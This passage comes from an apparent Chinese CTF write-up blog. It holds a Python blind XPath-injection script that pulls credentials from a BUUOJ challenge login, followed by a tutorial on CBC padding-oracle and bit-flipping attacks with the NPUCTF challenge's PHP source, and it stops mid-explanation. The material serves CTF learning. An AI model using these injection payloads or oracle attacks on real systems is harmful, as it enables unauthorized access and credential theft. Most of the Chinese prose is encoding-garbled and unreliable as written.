<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://a1de621a-25c0-4bb0-b867-649ffc93c5f0.node3.buuoj.cn/'</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">token</span><span class="params">()</span>:</span></span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">'&lt;input type="hidden" id="token" value="(.*)" /&gt;'</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(username,password,token())</span><br><span class="line"></span><br><span class="line">    req=sess.post(url+<span class="string">'login.php'</span>,data=data,headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;)</span><br><span class="line">    print(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">"' or  substring(name(/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'root'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'accounts'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'user'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment">#'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;' or'1'='1ä¹Ÿå¯ä»¥</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">'*'</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'*'</span>:</span><br><span class="line">            print(<span class="string">'false'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.format(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">'ad'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'éæ³•æ“ä½œ'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            print(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åç™»å½•è¿›å»ä¼ªåè®®å¤§å°å†™ç»•è¿‡å°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<h1 id="0x04-webğŸ•"><a href="#0x04-webğŸ•" class="headerlink" title="0x04 webğŸ•"></a>0x04 webğŸ•</h1><p><a href="https://mount4in.github.io/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/">çœ‹å‰ä¸€ç¯‡æ–‡ç« </a></p>
<p>å‚è€ƒï¼š</p>
<p><a href="https://github.com/sqxssss/NPUCTF_WriteUps" target="_blank" rel="noopener">https://github.com/sqxssss/NPUCTF_WriteUps</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»ä¸€é“ctfé¢˜å­¦ä¹ cbc-padding-oracleå’Œcbcç¿»è½¬</title>
    <url>/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/</url>
    <content><![CDATA[<p>ä¹‹å‰ä¸€ç›´ä¸æ€ä¹ˆæ¸…æ¥šcbcåŠ å¯†çš„padding-oracleå’Œcbcç¿»è½¬æ”»å‡»æ–¹æ³•ï¼Œè¿™æ¬¡NPUCTFæ¯”èµ›é‡åˆ°äº†ï¼Œå°±è®°å½•ä¸€ä¸‹å§</p>
<a id="more"></a>

<h1 id="0x01-CBCä»‹ç»"><a href="#0x01-CBCä»‹ç»" class="headerlink" title="0x01 CBCä»‹ç»"></a>0x01 CBCä»‹ç»</h1><p>CBCæ˜¯åˆ†ç»„åŠ å¯†çš„ä¸€ç§æ¨¡å¼ï¼Œå¸¸è§çš„åˆ†ç»„åŠ å¯†ç®—æ³•æœ‰DESã€AESç­‰ï¼Œåˆ†ç»„åŠ å¯†é¦–å…ˆå°†æ˜æ–‡åˆ†æˆè‹¥å¹²å›ºå®šé•¿åº¦çš„åˆ†ç»„ï¼ˆåˆ†ç»„é•¿åº¦è§†åŠ å¯†ç®—æ³•è€Œå®šï¼ŒDESåˆ†ç»„é•¿åº¦ä¸ºå…«å­—èŠ‚ã€AESåˆ†ç»„é•¿åº¦ä¸º16å­—èŠ‚ï¼‰ï¼Œç„¶ååˆ†åˆ«å¯¹æ¯ç»„çš„æ˜æ–‡è¿›è¡ŒåŠ å¯†ã€‚</p>
<p>ä¸‹é¢å¼•ç”¨ç»´åŸºç™¾ç§‘å¯¹CBCçš„ä»‹ç»ï¼š</p>
<blockquote>
<p>åœ¨CBCæ¨¡å¼ä¸­ï¼Œæ¯ä¸ªæ˜æ–‡å—å…ˆä¸å‰ä¸€ä¸ªå¯†æ–‡å—è¿›è¡Œå¼‚æˆ–åï¼Œå†è¿›è¡ŒåŠ å¯†ã€‚åœ¨è¿™ç§æ–¹æ³•ä¸­ï¼Œæ¯ä¸ªå¯†æ–‡å—éƒ½ä¾èµ–äºå®ƒå‰é¢çš„æ‰€æœ‰æ˜æ–‡å—ã€‚åŒæ—¶ï¼Œä¸ºäº†ä¿è¯æ¯æ¡æ¶ˆæ¯çš„å”¯ä¸€æ€§ï¼Œåœ¨ç¬¬ä¸€ä¸ªå—ä¸­éœ€è¦ä½¿ç”¨åˆå§‹åŒ–å‘é‡ã€‚</p>
</blockquote>
<p>è¯è¯´å¾—è¶Šå¤šä¹Ÿä¸å¦‚ä¸€ä¸ªå›¾æ¸…æ™°ã€‚</p>
<blockquote>
<p>Plaintextï¼šæ˜æ–‡</p>
<p>IVï¼šåˆå§‹åŒ–å‘é‡</p>
<p>Keyï¼šå¯†é’¥</p>
<p>Ciphertextï¼šå¯†æ–‡</p>
</blockquote>
<p>åŠ å¯†å›¾ï¼š</p>
<img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/Cbc_encryption.png" alt="Cbc encryption.png" style="zoom:150%;">

<p>è§£å¯†å›¾ï¼š</p>
<img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/Cbc_decryption.png" alt="Cbc decryption.png" style="zoom:150%;">

<ul>
<li>padding-oracle</li>
</ul>
<p>åˆ©ç”¨åœºæ™¯ï¼šå¯†æ–‡å¯æ§ï¼ŒæœåŠ¡å™¨å¯¹è§£å¯†å¤±è´¥ä¸å¦æœ‰ä¸åŒçš„å›æ˜¾</p>
<p>padding-oracleæ”»å‡»åŸç†æ˜¯åˆ†ç»„å¯†ç åŠ å¯†æ—¶åœ¨å¯¹æ˜æ–‡è¿›è¡Œåˆ†ç»„æ—¶ï¼Œé‡‡ç”¨PKCS#5å¡«å……æ ‡å‡†ï¼Œåœ¨æœ€åä¸€ä¸ªåˆ†ç»„å¡«å……æ»¡å‰©ä½™å­—èŠ‚ä¸ªæ•°å¯¹åº”çš„å­—ç¬¦ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/9113969-911e905ee20482be.png" alt="å›¾ç‰‡.png"></p>
<p>å¦‚æœæœåŠ¡å™¨åˆ©ç”¨è¿™ç§åŠ å¯†æ¨¡å¼ï¼Œæˆ‘ä»¬çš„å¯†ç ç»è¿‡CBCåŠ å¯†ä¼ è¾“åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡ç«¯åœ¨è§£å¯†å¯†æ–‡æ—¶ï¼Œç¬¬ä¸€æ­¥æ˜¯åˆ¤æ–­å¯†æ–‡æœ€åçš„ä¸€ä¸ªåˆ†ç»„æ˜¯å¦æ­£ç¡®ï¼Œæ˜¯å¦æ˜¯é‡‡ç”¨å¦‚ä¸Šå›¾æ‰€ç¤ºçš„å¡«å……è§„åˆ™ï¼Œå¦‚æœå¡«å……é”™è¯¯ï¼Œåˆ™ç›´æ¥è¿”å›é”™è¯¯ï¼›å¦‚æœæ­£ç¡®çš„è¯ï¼Œå†å°†è§£å¯†åçš„æ˜æ–‡ä¸æœåŠ¡å™¨å­˜å‚¨çš„æ˜æ–‡æ¯”å¯¹ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥çš„è®¤è¯ã€‚ä¸€èˆ¬ä¼šäº§ç”Ÿä¸‰ç§ç»“æœã€‚</p>
<ol>
<li>è§£å¯†æˆåŠŸå¹¶ä¸”å¾—åˆ°çš„æ˜æ–‡æ­£ç¡®ï¼Œè®¤è¯æˆåŠŸè¿”å›200</li>
<li>å¯ä»¥è§£å¯†ï¼ˆpaddingå¡«å……æ­£ç¡®ï¼‰ä½†æ˜¯è§£å¯†è·å¾—çš„æ˜æ–‡ä¸æ­£ç¡®ï¼Œè¿”å›200ï¼Œä½†è®¤è¯å¤±è´¥</li>
<li>ä¸å¯ä»¥è§£å¯†ï¼ˆpaddingå¡«å……å¤±è´¥ï¼‰ï¼Œè¿”ä¼šé”™è¯¯500</li>
</ol>
<p>å› ä¸ºç¬¬ä¸€ã€äºŒç§å’Œç¬¬ä¸‰ç§è¿”å›çš„ç»“æœä¸åŒï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªä¸åŒæ¥è¿›è¡Œå¦ä¸€ç§â€œç›²æ³¨â€ï¼Œæ¥æ‰¾åˆ°ä¸­é—´å€¼ï¼Œå³ä¸‹å›¾ç§çº¢æ¡†ä¸­çš„å€¼ã€‚</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422123432889.png" alt="image-20200422123432889"></p>
<blockquote>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/15083434757270.png!small" alt="Padding oracle attackè¯¦ç»†è§£æ"></p>
</blockquote>
<blockquote>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ˜æ–‡å¡«å……äº†å››ä½æ—¶ï¼Œå¦‚æœæœ€åä¸€ç»„å¯†æ–‡è§£å¯†åçš„ç»“æœï¼ˆIntermediary Valueä¹Ÿå°±æ˜¯ä¸­é—´å€¼ï¼‰ä¸å‰ä¸€ç»„å¯†æ–‡ï¼ˆInitialization Vectorä¹Ÿå°±æ˜¯IVå€¼ï¼‰å¼‚æˆ–å¾—åˆ°çš„æœ€åå››ä½æ˜¯0Ã—04ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šè¿”å›å¯ä»¥æ­£å¸¸è§£å¯†ã€‚</p>
<p>å›å¿†ä¸€ä¸‹å‰é¢æˆ‘ä»¬è¯´è¿‡çš„CBCæ¨¡å¼çš„è§£å¯†è¿‡ç¨‹ï¼Œç¬¬nç»„å¯†æ–‡è§£å¯†åçš„ä¸­é—´å€¼ä¸å‰ä¸€ç»„çš„å¯†æ–‡å¼‚æˆ–ä¾¿å¯å¾—åˆ°æ˜æ–‡ï¼Œç°åœ¨æˆ‘ä»¬ä¸çŸ¥é“è§£å¯†çš„å¯†é’¥keyï¼Œ<strong>ä½†æˆ‘ä»¬çŸ¥é“æ‰€æœ‰çš„å¯†æ–‡</strong>ï¼Œå› æ­¤åªè¦æˆ‘ä»¬èƒ½å¤Ÿå¾—åˆ°ä¸­é—´å€¼ä¾¿å¯ä»¥å¾—åˆ°æ­£ç¡®çš„å¯†æ–‡ï¼ˆè¿›è¡Œä¸€æ¬¡å¼‚æˆ–è¿ç®—ä¾¿å¯ï¼‰ï¼Œè€Œä¸­é—´å€¼æ˜¯ç”±æœåŠ¡å™¨è§£å¯†å¾—åˆ°çš„ï¼Œå› æ­¤æˆ‘ä»¬è™½ç„¶ä¸çŸ¥é“æ€ä¹ˆè§£å¯†ä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœåŠ¡å™¨å¸®æˆ‘ä»¬è§£å¯†ï¼Œæˆ‘ä»¬æ‰€è¦åšçš„æ˜¯èƒ½ç¡®å®šæˆ‘ä»¬å¾—åˆ°çš„ä¸­é—´å€¼æ˜¯æ­£ç¡®çš„ï¼Œè¿™ä¹Ÿæ˜¯padding oracle attackçš„æ ¸å¿ƒâ€”â€”æ‰¾å‡ºæ­£ç¡®çš„ä¸­é—´å€¼ã€‚</p>
<p>ä¸‹é¢æ˜¯æ”»å‡»æ­¥éª¤</p>
<p>ï¼ˆ1ï¼‰å‡è®¾æˆ‘ä»¬æ•è·åˆ°äº†ä¼ è¾“çš„å¯†æ–‡å¹¶ä¸”æˆ‘ä»¬çŸ¥é“æ˜¯CBCæ¨¡å¼é‡‡ç”¨çš„ä»€ä¹ˆåŠ å¯†ç®—æ³•ï¼Œæˆ‘ä»¬æŠŠå¯†æ–‡æŒ‰ç…§åŠ å¯†ç®—æ³•çš„è¦æ±‚åˆ†å¥½ç»„ï¼Œç„¶åå¯¹å€’æ•°ç¬¬äºŒç»„å¯†æ–‡è¿›è¡Œæ„é€ ï¼›</p>
<p>ï¼ˆ2ï¼‰å…ˆå‡å®šæ˜æ–‡åªå¡«å……äº†ä¸€å­—èŠ‚ï¼Œå¯¹å€’æ•°ç¬¬äºŒç»„å¯†æ–‡çš„æœ€åä¸€å­—èŠ‚ä»0Ã—00åˆ°0xffé€ä¸ªèµ‹å€¼å¹¶é€ä¸ªå‘æœåŠ¡å™¨æäº¤ï¼Œç›´åˆ°æœåŠ¡è¿”å›å€¼è¡¨ç¤ºæ„é€ åçš„å¯†æ–‡å¯ä»¥æ­£å¸¸è§£å¯†ï¼Œè¿™æ„å‘³ç€æ„é€ åçš„å¯†æ–‡ä½œä¸ºä¸­é—´å€¼ï¼ˆå›¾ä¸­é»„è‰²çš„é‚£ä¸€è¡Œï¼‰è§£å¯†æœ€åä¸€ç»„æ˜æ–‡ï¼Œæ˜æ–‡çš„æœ€åä¸€ä½æ˜¯0Ã—01ï¼ˆå¦‚å›¾æ‰€ç¤ºï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ„é€ çš„å€’æ•°ç¬¬äºŒç»„å¯†æ–‡çš„æœ€åä¸€å­—èŠ‚ä¸æœ€åä¸€ç»„å¯†æ–‡å¯¹åº”ä¸­é—´å€¼ï¼ˆç»¿è‰²çš„é‚£ä¸€è¡Œï¼‰çš„æœ€åä¸€ä½ç›¸å¼‚æˆ–çš„ç»“æœæ˜¯0Ã—01ï¼›</p>
<p><a href="https://image.3001.net/images/20171019/15083441758558.png" target="_blank" rel="noopener"><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/15083441758558.png!small" alt="Padding oracle attackè¯¦ç»†è§£æ" style="zoom: 200%;"></a></p>
<p>ï¼ˆ3ï¼‰åˆ©ç”¨å¼‚æˆ–è¿ç®—çš„æ€§è´¨ï¼Œæˆ‘ä»¬æŠŠæˆ‘ä»¬æ„é€ çš„å¯†æ–‡çš„æœ€åä¸€å­—èŠ‚ä¸0Ã—01å¼‚æˆ–ä¾¿å¯å¾—åˆ°æœ€åä¸€ä½å¯†æ–‡è§£å¯†åçš„ä¸­é—´å€¼æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œæˆ‘ä»¬è®¾ä¸ºM1ï¼Œè¿™ä¸€è¿‡ç¨‹å…¶å®å°±æ˜¯å¯¹åº”ä¸‹å›¾CBCè§£å¯†è¿‡ç¨‹ä¸­çº¢åœˆåœˆå‡ºæ¥çš„åœ°æ–¹ï¼Œ1å°±æ˜¯æˆ‘ä»¬æƒ³è¦å¾—åˆ°çš„ä¸­é—´å€¼ï¼Œ2å°±æ˜¯æˆ‘ä»¬æ„é€ çš„å¯†æ–‡ä¹Ÿå°±æ˜¯æœ€åä¸€ç»„å¯†æ–‡çš„IVå€¼ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†plaintextçš„æœ€åä¸€å­—èŠ‚æ˜¯0Ã—01ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹åˆ°å®ƒæ˜¯ç”±æˆ‘ä»¬æ„é€ çš„IVå€¼ä¸ä¸­é—´å€¼çš„æœ€åä¸€å­—èŠ‚å¼‚æˆ–å¾—åˆ°çš„ï¼›</p>
<p><a href="https://image.3001.net/images/20171019/15083453084853.png" target="_blank" rel="noopener"><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/15083453084853.png!small" alt="Padding oracle attackè¯¦ç»†è§£æ" style="zoom:150%;"></a></p>
<p>ï¼ˆ4ï¼‰å†å‡å®šæ˜æ–‡å¡«å……äº†ä¸¤å­—èŠ‚ä¹Ÿå°±æ˜¯æ˜æ–‡æœ€åä¸¤å­—èŠ‚æ˜¯0Ã—02ï¼Œæ¥ç€æ„é€ å€’æ•°ç¬¬äºŒç»„å¯†æ–‡ï¼Œæˆ‘ä»¬æŠŠM1ä¸0Ã—02å¼‚æˆ–å¯ä»¥å¾—åˆ°å¡«å……ä¸¤å­—èŠ‚æ—¶å¯†æ–‡çš„æœ€åä¸€ä½åº”è¯¥æ˜¯ä»€ä¹ˆï¼Œè¿™æ—¶å€™æˆ‘ä»¬åªéœ€è¦å¯¹å€’æ•°ç¬¬äºŒä½è¿›è¡Œä¸æ–­åœ°èµ‹å€¼å°è¯•ï¼ˆä¹Ÿæ˜¯ä»0Ã—00åˆ°0xffï¼‰ï¼Œå½“æœåŠ¡å™¨è¿”å›å€¼è¡¨ç¤ºå¯ä»¥æ­£å¸¸è§£å¯†æ—¶ï¼Œæˆ‘ä»¬æŠŠæ­¤æ—¶çš„å€’æ•°ç¬¬äºŒä½å¯†æ–‡çš„å–å€¼ä¸0Ã—02å¼‚æˆ–ä¾¿å¯å¾—åˆ°æœ€åä¸€ç»„å¯†æ–‡å€’æ•°ç¬¬äºŒå­—èŠ‚å¯¹åº”çš„ä¸­é—´å€¼ï¼›</p>
<p>ï¼ˆ5ï¼‰åå†æ„é€ å‡ºå€’æ•°ç¬¬ä¸‰å€’æ•°ç¬¬å››ç›´åˆ°å¾—åˆ°æœ€åä¸€ç»„å¯†æ–‡çš„ä¸­é—´å€¼ï¼ŒæŠŠè¿™ä¸ªä¸­é—´å€¼ä¸æˆªè·çš„å¯†æ–‡çš„å€’æ•°ç¬¬äºŒä½å¼‚æˆ–ä¾¿å¯å¾—åˆ°æœ€åä¸€ç»„åˆ†ç»„çš„æ˜æ–‡ï¼›</p>
<p>ï¼ˆ6ï¼‰èˆå¼ƒæ‰æœ€åä¸€ç»„å¯†æ–‡ï¼Œåªæäº¤ç¬¬ä¸€ç»„åˆ°å€’æ•°ç¬¬äºŒç»„å¯†æ–‡ï¼Œé€šè¿‡æ„é€ å€’æ•°ç¬¬ä¸‰ç»„å¯†æ–‡å¾—åˆ°å€’æ•°ç¬¬äºŒç»„å¯†æ–‡çš„é“­æ–‡ï¼Œæœ€åæˆ‘ä»¬ä¾¿å¯ä»¥å¾—åˆ°å…¨éƒ¨çš„æ˜æ–‡</p>
</blockquote>
<ul>
<li>CBCç¿»è½¬</li>
</ul>
<p>åˆ©ç”¨åœºæ™¯ï¼šè¾“å…¥å¯†æ–‡å¯æ§ï¼Œè€Œä¸”çŸ¥é“è¯¥å¯†æ–‡å¯¹åº”çš„æ˜æ–‡ã€‚</p>
<p>åœ¨è´´ä¸€ä¸‹cbcçš„è§£å¯†å›¾</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422125141629.png" alt="image-20200422125141629"></p>
<p>åœ¨ä¸Šå›¾è§£å¯†è¿‡ç¨‹ä¸­ï¼Œä¼šç”¨çº¢åœˆçš„å­—èŠ‚ä¸ç¬¬äºŒç»„å¯†æ–‡è§£å¯†åçš„ä¸­é—´å€¼å¼‚æˆ–æ¥å¾—åˆ°ç¬¬äºŒç»„æ˜æ–‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹å¯†æ–‡æ¥è¾¾åˆ°å‡†ç¡®ä¿®æ”¹æ˜æ–‡çš„ç›®çš„ï¼Œè‹¥æºæ˜æ–‡ä¸ºold_pï¼ŒåŸå¯†æ–‡ä¸ºold_cï¼Œæˆ‘ä»¬æƒ³å°†æ˜æ–‡ä¿®æ”¹ä¸ºtar_pï¼Œä¸­é—´å€¼ä¸ºinter_vã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inter_v ^ old_c &#x3D; old_p</span><br><span class="line">å°†old_c &#x3D;&gt; (old_c ^ tar_p ^ old_p)</span><br><span class="line">inter_v ^ (old_c ^ tar_p ^ old_p) &#x3D; old_p ^ tar_p ^old_p &#x3D; tar_p</span><br><span class="line">è¿™æ ·å³å®Œæˆäº†å¯¹æ˜æ–‡çš„ä¼ªé€ ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="0x02-NPUCTF-webğŸ•"><a href="#0x02-NPUCTF-webğŸ•" class="headerlink" title="0x02 NPUCTF webğŸ•"></a>0x02 NPUCTF webğŸ•</h1><p>é¦–å…ˆå¯ä»¥å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,********$file1*********</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//å®šä¹‰åŠ å¯†æ–¹å¼</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//å®šä¹‰å¯†é’¥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">çœŸä¸æ˜¯æ³¨å…¥</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);  <span class="comment">#ä¸è¿”å›å¯†æ–‡ï¼Œè§£å¯†æˆåŠŸè¿”å›1ï¼Œè§£å¯†å¤±è´¥è¿”å›False</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $file1;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æºç åˆå§‹åŒ–äº†åŠ å¯†æ–¹å¼ä¸ºaes-128-cbcã€IV ã€å¯†é’¥ï¼Œç„¶åæ ¹æ®æˆ‘ä»¬è¾“å…¥çš„methodå˜é‡ï¼Œè‹¥ä¸ºencryptä¼šæŠŠ$file1åŠ å¯†ï¼Œè‹¥ä¸ºdecryptä¼šç”¨æˆ‘ä»¬è¾“å…¥çš„ivä½œä¸ºå‘é‡ï¼ŒåŠ å¯†è¾“å…¥çš„dataå€¼ã€‚é¦–å…ˆå¯ä»¥è·å–åˆ°$file1çš„åŠ å¯†åçš„å€¼ï¼Œ</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422131503138.png" alt="image-20200422131503138"></p>
<p>ä¹±ç å› ä¸ºæºç çš„ç¼–ç æ–¹å¼æœ‰ç‚¹é—®é¢˜ï¼Œè¿™é‡Œå°±ä¸æ”¹äº†ã€‚ã€‚ã€‚ã€‚</p>
<p>ç„¶åè¿™é‡Œçš„è§£å¯†åŠŸèƒ½</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);  <span class="comment">#ä¸è¿”å›å¯†æ–‡ï¼Œè§£å¯†æˆåŠŸè¿”å›1ï¼Œè§£å¯†å¤±è´¥è¿”å›False</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè§£å¯†å¤±è´¥çš„è¯ä¼šè¿”å›Falseï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ç‚¹æ¥è¿›è¡Œpadding oracleäº†ï¼Œå°†é‚£ä¸²base64ç¼–ç è§£å¯†åå¾—åˆ°</p>
